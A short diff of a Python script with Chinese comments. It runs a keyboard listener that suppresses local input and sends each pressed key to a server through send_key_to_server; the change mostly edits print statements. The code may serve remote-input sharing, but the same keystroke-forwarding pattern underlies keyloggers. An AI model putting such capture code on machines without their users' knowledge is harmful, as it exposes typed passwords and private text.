@@ -28,13 +28,12 @@ def on_press(key):
         else:
             key_str = ''
 
-    sys.stdout.write(f"Pressed: {key_str}")
-    sys.stdout.flush()
-    # print(f"Pressed: {key_str}",flush=True)
+    print(f"Pressed: {key_str}")
     send_key_to_server(key_str)
 
 # 啟動鍵盤監聽器
 listener = KeyboardListener(on_press=on_press, suppress=True)
+# listener = KeyboardListener(on_press=on_press)
 listener.start()
 
 # 保持主執行緒存活（或你可以放你其他的主邏輯）
